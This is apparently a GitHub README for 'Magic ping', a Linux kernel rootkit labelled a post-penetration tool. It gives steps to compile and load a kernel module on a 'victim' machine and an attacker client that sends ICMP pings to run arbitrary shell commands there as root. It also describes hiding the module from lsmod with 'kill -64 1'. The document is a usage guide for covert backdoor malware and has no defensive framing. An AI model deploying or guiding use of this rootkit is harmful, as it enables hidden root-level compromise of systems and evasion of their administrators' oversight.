Magic ping - shell execution


<center>
<img src="https://img.shields.io/badge/License-MIT-informational" alt="License - MIT">
<a href="https://github.com/Zhang1933/linux-rootkit"><img src="https://img.shields.io/static/v1?label=Security&message=Post+penetration+tool&color=informational" alt="Security - Post penetration tool"></a>
<a href="https://github.com/Zhang1933/linux-rootkit"><img src="https://img.shields.io/static/v1?label=Tested+on&message=5.4.0-109-generic+%23123-Ubuntu+x86_64+GNU%2FLinux&color=yellowgreen" alt="Tested on - 5.4.0-109-generic #123-Ubuntu x86_64 GNU/Linux"></a>
</center>




## Features:

* Romete shell command execution by ping.
* Hiding (Showing) Kernel Module from Userspace. 


## Compile 

### compile server(victim) kernel module:
```bash
cd server && make
```

**Client(attacker):**

```bash
cd client && make
```

**Romete server (victim):**

```
sudo insmod server.mod
```

## Local attacker:

Need root privilege to send icmp packets for ping.
```
sudo ./client <victim ip address>
```

Then you can let remote victim execute whatever shell command you input as root privilege (some command may need full path).

## Hide(Show) remote kernel module:

Send signal 64 to show or hide:
```
kill -64 1
```
Use `lsmod` to check.

## TODO:

* Kernel version > 5.7 supporting.

## Thanks && Reference：

* [Hacking the Linux Kernel Network Stack](http://phrack.org/issues/61/13.html)
* [Does tcpdump bypass iptables?](https://superuser.com/questions/925286/does-tcpdump-bypass-iptables)
* [linux-network-programming-ping.c](https://github.com/coding-fans/linux-network-programming/blob/master/src/c/icmp/ping/ping.c)
* [Given a git commit hash, how to find out which kernel release contains it?](https://unix.stackexchange.com/questions/45120/given-a-git-commit-hash-how-to-find-out-which-kernel-release-contains-it)
* [Linux Rootkits Part 5: Hiding Kernel Modules from Userspace](https://xcellerator.github.io/posts/linux_rootkits_05/)
* [Hooking Linux Kernel Functions, Part 2: How to Hook Functions with Ftrace](https://www.apriorit.com/dev-blog/546-hooking-linux-functions-2)
